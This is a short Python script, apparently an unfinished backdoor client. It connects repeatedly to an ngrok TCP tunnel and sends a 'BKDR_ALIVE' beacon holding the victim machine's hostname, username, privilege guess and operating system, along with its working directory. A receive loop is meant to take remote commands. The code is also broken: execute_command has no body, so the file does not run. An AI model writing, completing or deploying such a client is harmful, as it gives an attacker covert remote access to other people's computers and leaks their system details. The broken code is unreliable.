"""
design@asij

"""

import getpass
import os
import socket
import platform
import time
import threading
import subprocess
import base64

# If the free version of ngrok is used, the port will change each time ngrok is activated
address = "0.tcp.jp.ngrok.io" # address
port = 18642 # port 


# Handles the connection of the client 
def connectClient():
  # Infinite loop to keep trying to connect to the server
  while True:
    try:
      # Creates a socket object as clientSocket
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as clientSocket:
        # Connect to server
        clientSocket.connect((address, port))
        send_beacon(clientSocket) # Send beacon to server to indicate that client is alive
        clientSocket.send(f"/{os.getcwd()}: ".encode("utf-8"))
    except Exception as e:
      print(f'[*] Connection failed: {e}. Trying in 10 seconds...')
      time.sleep(10) # Wait for 10 sec

def send_beacon(sock):
    beacon = f"BKDR_ALIVE|{platform.node()}|{getpass.getuser()}|{'ADMIN' if os.name=='nt' else 'USER'}|{platform.system()}"
    sock.send(beacon.encode("utf-8"))

def execute_command(command):

def command_handler(sock):
    while True:
        try:
            data = sock.recv(4096).decode("utf-8")
            if not data: break
            if data:
                print(f'[*] Received data: {data}')
        except Exception as e:
            print(f'[*] Error receiving data: {e}')
            break





if __name__ == "__main__":
  connectClient()
